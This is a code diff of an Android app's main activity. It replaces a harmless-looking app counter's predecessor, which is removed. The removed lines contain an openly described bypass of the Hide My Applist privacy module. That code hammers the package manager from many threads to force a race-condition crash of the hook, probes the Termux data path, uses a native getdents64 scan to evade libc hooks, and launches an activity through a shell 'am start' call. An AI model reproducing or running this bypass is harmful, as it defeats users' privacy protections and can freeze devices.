@@ -1,68 +1,46 @@
 package com.example.baseapp;
 
-import androidx.appcompat.app.AppCompatActivity;
-import android.os.Bundle;
-import android.util.Log;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import java.io.File;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import java.util.List;
 import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
-
-    private static final String TAG = "HMA_TERMINATOR";
-    private static final String TARGET = "com.termux";
-
-    static {
-        System.loadLibrary("native-lib");
-    }
-
-    // JNI 接口：使用底层 getdents64 绕过 libc Hook
-    public native void rawDirectoryScan();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        Log.w(TAG, "=== 爆破程序启动：准备击穿 HMA 防御层 ===");
+        TextView tvResult = findViewById(R.id.tv_result);
+        Handler mainHandler = new Handler(Looper.getMainLooper());
 
-        // 核心爆破逻辑：64 线程高频冲击 uidHideCache
-        // 目标：触发 ConcurrentModificationException 迫使 HMA 执行 unload()
-        Executors.newFixedThreadPool(64).execute(() -> {
-            while (true) {
-                for (int i = 0; i < 64; i++) {
-                    new Thread(() -> {
-                        try {
-                            // 1. 疯狂请求，冲击 HMA 的 ArrayList 临界区 (uidHideCache)
-                            // 这一步会不断触发 HMA 的 read/write 操作
-                            getPackageManager().getPackageInfo(TARGET, 0);
-                        } catch (Exception e) {
-                            // 捕获并发异常，但这正是我们要制造的“混乱”
-                        }
+        Executors.newSingleThreadExecutor().execute(() -> {
+            PackageManager pm = getPackageManager();
+            List<ApplicationInfo> allApps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
 
-                        // 2. 实时探测：检查文件系统是否已经因为 Hook 卸载而暴露
-                        if (new File("/data/data/" + TARGET).exists()) {
-                            Log.e(TAG, "!!! 突破成功 !!! 物理路径已暴露，HMA 防线瓦解！");
-                            // 此时调用 Native 扫描，双重确认
-                            rawDirectoryScan();
-                        }
-                    }).start();
+            int systemAppCount = 0;
+            int userAppCount = 0;
+
+            for (ApplicationInfo appInfo : allApps) {
+                if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
+                    systemAppCount++;
+                } else {
+                    userAppCount++;
                 }
-                
-                // 给 CPU 留一点时间，防止整个 Android UI 系统彻底卡死导致重启
-                try { Thread.sleep(50); } catch (InterruptedException e) {}
             }
-        });
 
-        // 辅助爆破：尝试通过匿名路径/系统 Shell 权限启动
-        new Thread(() -> {
-            try {
-                Log.w(TAG, ">>> 执行匿名 Context 绕过尝试...");
-                // 利用 am 启动，某些版本的 HMA 在处理这种间接启动时 callingPackage 会丢失
-                Runtime.getRuntime().exec("am start -n com.termux/.app.TermuxActivity");
-            } catch (Exception e) {
-                Log.e(TAG, "am start 尝试失败");
-            }
-        }).start();
+            final String result = "应用列表检测结果\n\n"
+                    + "系统应用数量：" + systemAppCount + "\n"
+                    + "用户应用数量：" + userAppCount + "\n"
+                    + "总计：" + allApps.size() + " 个应用";
+
+            mainHandler.post(() -> tvResult.setText(result));
+        });
     }
 }
